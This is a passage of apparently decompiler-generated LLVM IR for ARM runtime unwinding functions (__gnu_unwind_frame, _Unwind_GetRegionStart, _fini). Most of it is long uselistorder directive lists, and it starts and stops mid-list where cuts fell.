309, 310, 337, 338, 339, 340, 341, 342, 343, 344, 16, 345, 346, 347, 285, 286, 273, 274, 275, 276, 287, 290, 291, 292, 288, 289, 221, 222, 223, 224, 120, 123, 124, 125, 121, 122, 30, 126, 127, 293, 296, 297, 298, 294, 295, 299, 300, 170, 171, 172, 173, 174, 179, 180, 181, 182, 175, 176, 177, 178, 183, 184, 185, 186, 187, 188, 163, 164, 128, 129, 130, 131, 132, 133, 189, 190, 366, 367, 134, 17, 135, 136, 408, 18, 409, 410, 411, 412, 191, 192, 193, 194, 195, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 47, 48, 34, 31, 19, 32, 2, 33, 46, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 49, 50, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 20, 165, 166, 167, 168, 169, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 28, 214, 215, 216, 217, 218, 225, 29, 226, 227, 228, 229, 230, 235, 236, 237, 238, 239, 240, 241, 242, 21, 243, 244, 245, 246, 247, 248, 249, 250, 251, 4, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 277, 22, 278, 279, 280, 24, 23, 281, 282, 283, 284, 26, 25, 301, 302, 303, 304, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 350, 348, 349, 27, 351, 352, 353, 354, 355, 356, 357, 358, 359, 368, 369, 370, 371 }
  uselistorder i32* @lr, { 4, 0, 173, 174, 175, 176, 184, 177, 178, 179, 180, 2, 181, 182, 183, 185, 186, 187, 188, 189, 190, 192, 193, 7, 8, 194, 195, 196, 197, 198, 199, 200, 201, 202, 11, 12, 13, 14, 15, 16, 17, 18, 19, 9, 10, 20, 203, 204, 206, 207, 208, 213, 88, 89, 23, 24, 211, 212, 128, 129, 170, 171, 172, 205, 209, 210, 5, 21, 22, 145, 146, 147, 148, 149, 138, 139, 140, 150, 163, 164, 151, 152, 153, 154, 155, 156, 157, 3, 158, 159, 161, 162, 160, 130, 131, 136, 137, 81, 82, 25, 26, 165, 166, 57, 58, 59, 60, 61, 62, 27, 28, 191, 63, 167, 90, 6, 29, 30, 31, 32, 33, 1, 37, 38, 39, 40, 41, 42, 34, 35, 36, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 83, 84, 85, 86, 87, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 132, 133, 134, 135, 141, 142, 143, 144, 168, 169 }
  uselistorder i32* @r6, { 466, 467, 468, 479, 469, 27, 470, 4, 471, 472, 5, 473, 474, 475, 476, 477, 478, 480, 0, 481, 482, 95, 96, 93, 94, 97, 483, 484, 6, 485, 486, 487, 488, 80, 81, 98, 7, 99, 100, 101, 102, 103, 23, 104, 105, 106, 8, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 78, 79, 82, 83, 84, 85, 9, 86, 87, 88, 10, 89, 90, 91, 92, 119, 28, 120, 24, 11, 12, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 456, 457, 458, 492, 459, 13, 460, 461, 75, 14, 76, 15, 77, 489, 490, 491, 409, 413, 414, 415, 416, 410, 411, 412, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 417, 442, 443, 444, 418, 419, 420, 421, 422, 16, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 438, 440, 434, 435, 436, 437, 439, 441, 132, 133, 1, 134, 31, 335, 336, 361, 362, 363, 364, 365, 268, 269, 135, 136, 137, 138, 139, 366, 367, 368, 369, 370, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 140, 141, 142, 143, 144, 145, 146, 147, 226, 17, 227, 228, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 38, 162, 163, 164, 165, 32, 166, 167, 168, 62, 169, 52, 63, 64, 65, 66, 67, 33, 34, 35, 53, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 54, 55, 56, 57, 58, 59, 60, 61, 68, 69, 70, 71, 72, 73, 74, 170, 171, 172, 3, 2, 173, 174, 175, 176, 177, 178, 179, 25, 180, 181, 182, 183, 184, 191, 192, 193, 194, 195, 185, 186, 187, 188, 189, 190, 275, 276, 277, 278, 196, 197, 198, 199, 200, 201, 202, 203, 18, 204, 205, 206, 207, 208, 209, 210, 211, 229, 230, 231, 232, 26, 233, 234, 235, 19, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 270, 271, 272, 273, 274, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 29, 20, 350, 351, 353, 354, 352, 355, 356, 357, 358, 359, 360, 371, 372, 30, 21, 373, 374, 376, 377, 375, 378, 379, 380, 381, 382, 383, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 22, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 462, 463, 464, 465 }
  uselistorder label %dec_label_pc_18c58, { 1, 0 }
  uselistorder label %dec_label_pc_18bf4, { 1, 0 }
  uselistorder label %dec_label_pc_18ba0, { 1, 0 }
  uselistorder label %dec_label_pc_18b78, { 1, 0 }
  uselistorder label %dec_label_pc_18ae4, { 1, 0 }
  uselistorder label %dec_label_pc_18ac8, { 1, 0 }
  uselistorder label %dec_label_pc_18aac, { 1, 0 }
  uselistorder label %dec_label_pc_18a5c, { 1, 0 }
  uselistorder label %dec_label_pc_18a40, { 1, 0 }
  uselistorder label %dec_label_pc_189bc, { 1, 0 }
  uselistorder label %dec_label_pc_189a0, { 1, 0 }
  uselistorder label %dec_label_pc_188dc, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_188ac, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_18894, { 1, 0 }
  uselistorder label %dec_label_pc_18878, { 1, 0 }
  uselistorder label %dec_label_pc_185dc.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_18704, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_186f8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_186ec, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_1869c, { 1, 0 }
  uselistorder label %dec_label_pc_1868c, { 1, 0 }
  uselistorder label %dec_label_pc_18618, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_18ce0 = add i32 %ucbp, 76
  %v2_18ce0 = inttoptr i32 %v1_18ce0 to i32*
  %v3_18ce0 = load i32, i32* %v2_18ce0, align 4
  %v1_18ce4 = add i32 %v3_18ce0, 4
  %v2_18ce4 = inttoptr i32 %v1_18ce4 to i32*
  %v3_18ce4 = load i32, i32* %v2_18ce4, align 4
  %v3_18cec = mul i32 %v3_18ce4, 256
  %v4_18cf4 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_18cec, i32* %v4_18cf4, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_18d14 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_18d14

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 332, 321, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 311, 322, 319, 50, 320, 51, 52, 53, 310, 312, 315, 54, 55, 56, 0, 318, 1, 57, 58, 59, 60, 62, 63, 64, 61, 66, 67, 68, 65, 69, 316, 70, 323, 324, 71, 72, 73, 326, 74, 75, 77, 76, 78, 79, 80, 81, 82, 83, 84, 87, 86, 85, 88, 317, 327, 325, 89, 90, 91, 92, 93, 94, 96, 95, 97, 99, 98, 100, 101, 102, 2, 111, 107, 112, 108, 103, 104, 105, 113, 109, 114, 110, 106, 115, 116, 117, 118, 119, 120, 130, 131, 125, 132, 126, 121, 122, 127, 133, 128, 134, 129, 123, 124, 135, 136, 137, 138, 143, 141, 139, 144, 142, 140, 145, 146, 150, 154, 155, 151, 147, 148, 152, 149, 153, 156, 157, 313, 328, 158, 160, 159, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 175, 173, 171, 176, 174, 172, 177, 178, 182, 186, 187, 183, 179, 180, 184, 181, 185, 188, 189, 314, 329, 190, 192, 191, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 330, 203, 331, 212, 207, 213, 208, 209, 204, 205, 214, 210, 206, 211, 215, 216, 217, 218, 219, 220, 221, 222, 229, 226, 230, 227, 231, 228, 223, 224, 225, 232, 233, 234, 235, 236, 241, 248, 242, 249, 243, 237, 238, 250, 244, 239, 245, 251, 246, 240, 247, 252, 253, 254, 255, 256, 257, 258, 263, 270, 264, 271, 265, 259, 260, 272, 266, 261, 267, 273, 268, 262, 269, 274, 275, 276, 277, 278, 279, 280, 290, 286, 281, 291, 287, 292, 288, 282, 283, 284, 293, 289, 285, 294, 295, 296, 297, 298, 299, 300, 301, 3, 302, 303, 304, 305, 306, 4, 307, 308, 309 }
  uselistorder i32 4, { 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 106, 499, 500, 501, 502, 503, 4, 506, 507, 504, 505, 508, 5, 509, 510, 511, 512, 6, 529, 7, 513, 514, 515, 516, 517, 8, 518, 9, 519, 520, 521, 522, 523, 524, 525, 10, 526, 142, 527, 528, 530, 531, 532, 533, 11, 534, 12, 252, 253, 254, 255, 271, 272, 535, 233, 234, 431, 239, 256, 13, 14, 538, 15, 16, 89, 84, 85, 17, 539, 86, 540, 71, 18, 19, 87, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 20, 558, 559, 560, 561, 562, 563, 70, 564, 565, 566, 567, 568, 569, 21, 22, 88, 570, 264, 107, 262, 263, 257, 258, 259, 260, 261, 235, 236, 237, 238, 240, 241, 242, 243, 244, 245, 23, 246, 108, 247, 248, 249, 250, 251, 143, 265, 266, 267, 268, 269, 270, 24, 273, 274, 275, 276, 311, 312, 277, 278, 279, 571, 25, 144, 109, 145, 573, 26, 574, 146, 232, 572, 81, 482, 483, 484, 485, 147, 72, 435, 436, 437, 438, 439, 440, 148, 149, 27, 441, 442, 443, 444, 445, 446, 447, 448, 150, 433, 434, 406, 407, 408, 409, 410, 411, 412, 413, 414, 28, 415, 416, 417, 449, 29, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 151, 152, 153, 464, 465, 468, 471, 466, 467, 110, 154, 469, 63, 470, 472, 473, 474, 476, 155, 31, 30, 475, 156, 157, 158, 280, 32, 33, 34, 35, 36, 159, 64, 37, 38, 313, 314, 315, 316, 317, 39, 318, 73, 536, 537, 205, 40, 41, 111, 281, 74, 282, 118, 283, 284, 285, 42, 286, 90, 112, 113, 221, 222, 228, 229, 114, 206, 207, 208, 209, 210, 211, 115, 212, 213, 214, 116, 215, 117, 216, 217, 218, 219, 220, 223, 224, 225, 226, 227, 230, 231, 66, 65, 287, 82, 288, 43, 289, 44, 68, 67, 291, 45, 290, 292, 293, 298, 119, 300, 120, 301, 121, 302, 303, 299, 294, 122, 295, 296, 297, 403, 304, 79, 78, 77, 305, 123, 46, 47, 48, 49, 50, 306, 76, 75, 307, 80, 124, 308, 309, 310, 319, 320, 160, 321, 322, 323, 161, 162, 0, 125, 324, 91, 325, 326, 327, 163, 328, 329, 164, 165, 1, 126, 330, 92, 331, 93, 332, 333, 334, 335, 166, 336, 337, 167, 168, 338, 339, 127, 340, 2, 341, 94, 342, 128, 343, 344, 345, 346, 169, 347, 348, 170, 171, 349, 350, 129, 351, 3, 352, 95, 353, 130, 354, 51, 355, 356, 357, 172, 358, 359, 360, 361, 173, 174, 131, 362, 132, 363, 96, 364, 365, 366, 175, 367, 368, 176, 177, 369, 97, 370, 98, 371, 372, 373, 374, 178, 375, 376, 179, 180, 134, 377, 133, 378, 99, 379, 100, 380, 381, 382, 383, 384, 385, 136, 386, 137, 387, 181, 388, 69, 389, 182, 183, 138, 390, 135, 391, 101, 392, 102, 393, 394, 395, 184, 396, 397, 185, 186, 398, 139, 399, 103, 400, 187, 188, 189, 401, 402, 140, 104, 190, 191, 192, 404, 405, 141, 105, 193, 52, 418, 194, 53, 419, 195, 54, 420, 196, 55, 421, 197, 56, 422, 198, 83, 57, 423, 424, 199, 58, 425, 200, 59, 426, 201, 60, 427, 202, 61, 428, 203, 62, 429, 430, 432, 477, 478, 479, 480, 481, 486, 204, 487, 488 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 1, { 716, 1258, 1259, 559, 1263, 1264, 1265, 1266, 600, 1267, 1268, 525, 540, 601, 1260, 1261, 1262, 1269, 560, 1270, 717, 311, 316, 314, 312, 317, 313, 315, 718, 719, 720, 721, 602, 603, 1271, 1272, 512, 724, 723, 722, 113, 115, 116, 114, 117, 112, 727, 726, 725, 284, 604, 605, 56, 1273, 53, 1274, 730, 729, 728, 309, 1275, 1276, 1277, 1278, 732, 731, 101, 103, 104, 102, 105, 142, 143, 517, 733, 389, 983, 734, 390, 391, 392, 735, 107, 984, 985, 986, 50, 49, 51, 52, 736, 118, 737, 163, 160, 161, 159, 162, 738, 565, 956, 339, 340, 338, 111, 110, 1279, 541, 606, 1280, 1, 0, 739, 127, 122, 120, 121, 128, 125, 126, 123, 124, 119, 80, 607, 57, 740, 394, 395, 393, 526, 558, 527, 1202, 1203, 1204, 1205, 542, 741, 396, 743, 742, 397, 398, 962, 744, 987, 988, 989, 1282, 991, 990, 513, 745, 530, 992, 531, 1283, 958, 957, 1284, 532, 1285, 1286, 1287, 1288, 1289, 1290, 921, 1291, 1292, 1293, 1294, 1295, 1296, 922, 708, 747, 746, 483, 487, 489, 485, 484, 486, 488, 490, 492, 491, 996, 993, 994, 995, 555, 533, 35, 36, 38, 37, 608, 997, 998, 1013, 1014, 748, 709, 21, 22, 1005, 923, 1006, 1007, 924, 1008, 1009, 1010, 1011, 1012, 77, 71, 72, 74, 78, 75, 73, 76, 70, 79, 999, 1000, 1001, 609, 1002, 1003, 1004, 749, 500, 497, 495, 493, 501, 494, 498, 496, 499, 1015, 1016, 1017, 750, 248, 247, 244, 243, 242, 250, 245, 246, 249, 1018, 1019, 1020, 1021, 751, 93, 94, 92, 96, 95, 97, 752, 69, 960, 610, 959, 556, 755, 754, 753, 400, 403, 399, 401, 408, 402, 407, 406, 404, 405, 611, 961, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 534, 756, 410, 409, 411, 414, 412, 413, 415, 974, 975, 976, 977, 978, 979, 980, 981, 982, 757, 40, 44, 46, 43, 41, 45, 42, 47, 612, 973, 758, 297, 1022, 1023, 1024, 1025, 1026, 613, 759, 81, 82, 84, 83, 85, 614, 39, 760, 211, 210, 207, 208, 209, 205, 206, 761, 212, 213, 220, 221, 216, 217, 218, 219, 214, 215, 762, 139, 137, 138, 763, 416, 764, 99, 98, 765, 288, 287, 766, 55, 54, 767, 1078, 130, 133, 131, 132, 417, 108, 109, 768, 87, 86, 769, 68, 770, 771, 387, 388, 1297, 1298, 1299, 615, 1300, 1301, 616, 1302, 774, 773, 772, 149, 151, 157, 150, 155, 154, 158, 156, 152, 153, 775, 140, 617, 776, 418, 419, 420, 777, 426, 424, 425, 423, 421, 422, 778, 146, 147, 145, 148, 144, 779, 780, 294, 782, 781, 65, 783, 129, 1251, 786, 785, 784, 66, 67, 787, 58, 60, 59, 61, 535, 788, 318, 510, 514, 1252, 789, 19, 16, 17, 18, 20, 15, 1253, 1254, 1255, 791, 790, 428, 427, 431, 434, 433, 432, 430, 436, 429, 435, 437, 141, 518, 953, 954, 955, 792, 793, 528, 1065, 529, 1066, 1067, 519, 1068, 439, 443, 438, 441, 442, 445, 446, 444, 440, 1069, 1303, 543, 618, 795, 794, 796, 1207, 1210, 1211, 1212, 797, 447, 452, 453, 451, 450, 454, 448, 449, 1213, 1214, 1215, 1216, 798, 459, 465, 458, 464, 463, 457, 466, 467, 461, 455, 460, 456, 462, 1208, 1209, 619, 799, 62, 64, 63, 291, 1191, 620, 1192, 1193, 1194, 1195, 1196, 800, 11, 12, 10, 13, 1217, 351, 350, 1218, 1219, 1220, 1221, 1222, 1223, 566, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 622, 1232, 1233, 1234, 1235, 1236, 621, 1237, 1238, 1239, 1240, 1241, 801, 470, 472, 468, 471, 476, 478, 475, 477, 479, 473, 474, 469, 362, 361, 623, 624, 523, 805, 804, 803, 802, 241, 14, 536, 276, 806, 229, 228, 807, 366, 365, 808, 367, 809, 480, 810, 811, 481, 812, 232, 813, 482, 814, 310, 815, 505, 816, 280, 279, 817, 369, 368, 818, 819, 506, 820, 320, 319, 821, 1143, 1144, 23, 24, 926, 927, 928, 929, 930, 931, 932, 1304, 305, 306, 307, 308, 822, 1079, 625, 289, 290, 1027, 823, 227, 226, 298, 626, 1080, 824, 285, 286, 627, 825, 304, 302, 303, 1081, 826, 301, 300, 299, 827, 183, 182, 828, 829, 364, 363, 830, 184, 831, 502, 832, 264, 833, 225, 224, 834, 321, 836, 835, 222, 223, 838, 837, 292, 293, 230, 511, 1281, 296, 295, 1082, 1083, 1084, 1085, 516, 1086, 840, 839, 349, 348, 343, 346, 344, 345, 341, 342, 347, 2, 1070, 1071, 1072, 1073, 1145, 537, 1146, 538, 1147, 842, 841, 503, 1087, 1088, 1089, 1090, 843, 1198, 1199, 544, 3, 515, 4, 1200, 1028, 1029, 1030, 628, 1091, 504, 1242, 231, 1093, 1092, 1094, 48, 1148, 1163, 844, 167, 166, 165, 164, 1149, 845, 188, 187, 186, 185, 640, 1031, 641, 1032, 567, 1033, 642, 951, 1034, 630, 1035, 546, 643, 644, 936, 933, 632, 524, 934, 935, 633, 937, 938, 939, 634, 940, 941, 637, 942, 943, 635, 944, 945, 636, 631, 946, 947, 948, 638, 949, 950, 639, 952, 1036, 1037, 1038, 645, 1039, 1040, 1041, 646, 545, 1042, 925, 1045, 1044, 629, 1043, 1046, 1047, 647, 1048, 1049, 1050, 547, 1057, 1058, 520, 648, 710, 857, 856, 855, 854, 853, 852, 851, 850, 849, 848, 847, 846, 336, 337, 335, 334, 332, 333, 331, 1051, 1052, 649, 1053, 1054, 650, 1055, 1056, 193, 192, 191, 197, 194, 195, 196, 190, 189, 651, 652, 859, 858, 508, 509, 1187, 553, 539, 860, 33, 32, 31, 30, 34, 28, 26, 25, 27, 29, 1150, 862, 861, 261, 262, 260, 259, 258, 257, 263, 569, 1059, 655, 1060, 568, 1061, 1062, 653, 654, 656, 1063, 1064, 657, 658, 659, 660, 661, 662, 663, 874, 873, 872, 871, 870, 869, 868, 867, 866, 715, 865, 864, 863, 281, 283, 282, 664, 521, 665, 875, 666, 667, 668, 669, 1074, 554, 1075, 1076, 670, 557, 671, 1077, 522, 672, 883, 882, 881, 880, 879, 878, 877, 876, 88, 90, 89, 91, 1095, 1101, 6, 548, 1096, 673, 1097, 5, 1098, 561, 1099, 549, 550, 1100, 1102, 1103, 562, 1104, 711, 887, 886, 712, 885, 884, 275, 1177, 570, 571, 1178, 7, 8, 9, 1105, 1106, 1107, 674, 1108, 675, 676, 1109, 572, 1110, 888, 380, 384, 385, 386, 383, 379, 382, 381, 1111, 1112, 1113, 677, 1114, 678, 574, 573, 679, 1115, 680, 1116, 889, 373, 376, 377, 378, 375, 370, 374, 371, 372, 1117, 1118, 1119, 1120, 1121, 681, 1122, 682, 1123, 683, 579, 578, 684, 1124, 575, 1125, 576, 1126, 577, 1127, 895, 894, 893, 892, 891, 890, 171, 172, 174, 173, 168, 170, 169, 1128, 1129, 1130, 1131, 1132, 685, 1133, 686, 1134, 687, 588, 587, 688, 1135, 586, 1136, 585, 1137, 580, 1138, 581, 1139, 582, 1140, 583, 1141, 584, 1142, 901, 900, 899, 898, 897, 896, 178, 179, 181, 180, 175, 177, 176, 1151, 1152, 1153, 1154, 1155, 563, 564, 689, 1156, 1157, 690, 1158, 1159, 691, 1160, 1162, 1161, 905, 904, 903, 902, 238, 234, 235, 236, 240, 237, 233, 239, 1164, 1165, 1166, 692, 693, 907, 906, 252, 255, 256, 251, 254, 253, 1167, 1168, 1169, 694, 591, 590, 695, 1170, 589, 1171, 908, 267, 268, 272, 273, 274, 271, 270, 269, 1172, 1173, 1174, 696, 594, 593, 697, 1175, 592, 1176, 913, 912, 911, 910, 909, 353, 354, 359, 358, 360, 357, 355, 352, 356, 1179, 1180, 1181, 698, 1182, 699, 596, 595, 700, 1183, 914, 325, 328, 329, 330, 327, 323, 326, 324, 1184, 1185, 701, 1186, 597, 551, 702, 713, 265, 266, 1188, 1189, 703, 1190, 598, 552, 704, 714, 277, 278, 1197, 599, 705, 915, 134, 135, 136, 1201, 916, 322, 1206, 917, 198, 1243, 1246, 706, 1247, 1248, 1244, 1245, 1249, 1250, 200, 201, 203, 202, 199, 204, 1256, 707, 918, 106, 1257, 100, 919, 920, 507 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_18d40 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_18d48 = add i32 %tmp1, 72
  %v2_18d48 = inttoptr i32 %v1_18d48 to i32*
  %v3_18d48 = load i32, i32* %v2_18d48, align 4
  ret i32 %v3_18d48

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 2, 3, 1, 4, 7, 8, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 0, 2, 1 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 8, 7, 10, 9, 170, 171, 172, 173, 14, 15, 60, 16, 174, 52, 11, 175, 176, 177, 178, 179, 181, 182, 180, 183, 184, 185, 186, 187, 188, 189, 17, 18, 19, 20, 22, 21, 23, 53, 54, 24, 25, 55, 56, 57, 58, 59, 61, 62, 86, 63, 64, 190, 5, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 3, 124, 125, 126, 127, 128, 26, 129, 147, 27, 28, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 166, 159, 160, 161, 162, 163, 164, 165, 167, 168, 29, 169, 4, 87, 88, 30, 89, 90, 91, 31, 65, 66, 67, 42, 68, 39, 69, 50, 40, 41, 43, 44, 45, 46, 47, 48, 49, 51, 70, 71, 72, 6, 73, 74, 75, 76, 78, 79, 38, 80, 32, 81, 33, 82, 34, 83, 85, 84, 77, 121, 92, 93, 35, 94, 95, 96, 36, 97, 98, 99, 100, 101, 102, 12, 103, 104, 105, 106, 107, 108, 13, 109, 110, 37, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 122, 123, 0, 1, 2 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_18d5c = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_18d5c)
  %v31_18d64 = load i32, i32* @r0, align 4
  ret i32 %v31_18d64

; uselistorder directives
  uselistorder i32* @r0, { 13, 14, 15, 237, 238, 239, 16, 19, 79, 90, 240, 243, 244, 70, 17, 241, 242, 219, 46, 8, 245, 9, 18, 80, 0, 81, 10, 11, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 1, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 82, 42, 71, 72, 73, 74, 75, 76, 77, 78, 83, 84, 85, 86, 87, 88, 89, 20, 235, 21, 236, 22, 23, 24, 25, 161, 162, 272, 273, 275, 58, 59, 60, 61, 26, 193, 194, 2, 27, 28, 92, 93, 3, 29, 30, 276, 277, 4, 31, 32, 202, 203, 5, 33, 34, 67, 68, 274, 146, 91, 221, 35, 55, 56, 222, 6, 223, 224, 225, 213, 53, 214, 215, 216, 54, 217, 218, 36, 233, 226, 227, 228, 229, 230, 231, 232, 94, 95, 37, 204, 38, 205, 209, 39, 210, 189, 40, 190, 96, 41, 97, 211, 49, 212, 98, 43, 44, 163, 164, 165, 166, 99, 45, 100, 47, 48, 167, 168, 169, 170, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 64, 65, 131, 62, 63, 66, 132, 135, 136, 137, 138, 139, 140, 133, 134, 51, 141, 142, 143, 144, 145, 69, 147, 148, 52, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 171, 172, 173, 174, 175, 176, 177, 12, 178, 179, 180, 181, 182, 183, 184, 206, 207, 7, 185, 186, 187, 188, 191, 192, 195, 196, 197, 198, 199, 200, 201, 208, 220, 234, 57, 50 }
  uselistorder void (i32)* @__pseudo_branch, { 2, 69, 62, 63, 64, 65, 66, 67, 68, 70, 71, 72, 73, 18, 19, 20, 21, 22, 23, 14, 15, 16, 17, 24, 25, 26, 27, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 28, 29, 30, 74, 79, 80, 81, 82, 83, 84, 85, 75, 89, 90, 91, 92, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 40, 76, 77, 78, 86, 87, 88, 41, 42, 43, 0, 37, 38, 39, 44, 48, 49, 45, 46, 47, 1, 93, 31, 32, 33, 34, 35, 36, 60, 61 }
  uselistorder i32 0, { 409, 408, 474, 475, 1334, 413, 412, 476, 1335, 1336, 1337, 1338, 360, 359, 477, 1339, 1340, 199, 1341, 1343, 1344, 146, 147, 1345, 1346, 1342, 93, 94, 95, 96, 2, 1, 3, 0, 188, 187, 189, 190, 191, 1347, 410, 411, 140, 135, 1348, 1349, 193, 194, 192, 195, 1350, 1351, 1352, 1353, 198, 197, 196, 1354, 1355, 1356, 400, 399, 478, 414, 479, 415, 480, 416, 481, 482, 483, 148, 1357, 430, 429, 1358, 1359, 428, 427, 1360, 484, 425, 426, 423, 424, 422, 421, 1361, 420, 419, 418, 417, 369, 1362, 1378, 1363, 202, 1364, 1365, 1366, 1367, 1368, 1369, 204, 1371, 1372, 200, 201, 1373, 1374, 126, 149, 1375, 1376, 659, 97, 98, 401, 402, 203, 1370, 1377, 368, 1379, 485, 486, 1380, 432, 431, 205, 1381, 1382, 206, 1383, 1384, 1385, 109, 487, 488, 1386, 207, 1387, 150, 1388, 1389, 208, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 38, 127, 489, 1400, 209, 1401, 1402, 1403, 4, 1404, 1405, 5, 1406, 1407, 872, 873, 6, 141, 1408, 490, 1409, 786, 787, 788, 789, 790, 794, 791, 792, 793, 7, 370, 99, 795, 491, 796, 797, 798, 433, 434, 874, 875, 8, 492, 731, 493, 1410, 1411, 1412, 9, 10, 151, 152, 153, 1427, 1428, 11, 732, 154, 155, 1244, 1245, 1246, 1247, 210, 211, 1248, 741, 212, 128, 48, 1429, 100, 371, 1433, 1434, 49, 799, 110, 800, 801, 802, 372, 156, 1430, 1431, 1432, 373, 12, 1435, 1436, 1437, 1438, 1439, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1440, 1441, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 39, 1460, 1461, 1462, 1463, 1464, 40, 1465, 1466, 1467, 41, 1468, 1469, 1470, 42, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1495, 1496, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 43, 1514, 1515, 1516, 1517, 1518, 44, 1519, 1520, 1521, 1522, 1523, 45, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 213, 803, 660, 804, 805, 806, 807, 841, 494, 495, 842, 843, 157, 158, 159, 217, 808, 215, 809, 830, 823, 661, 824, 825, 826, 827, 50, 51, 113, 828, 829, 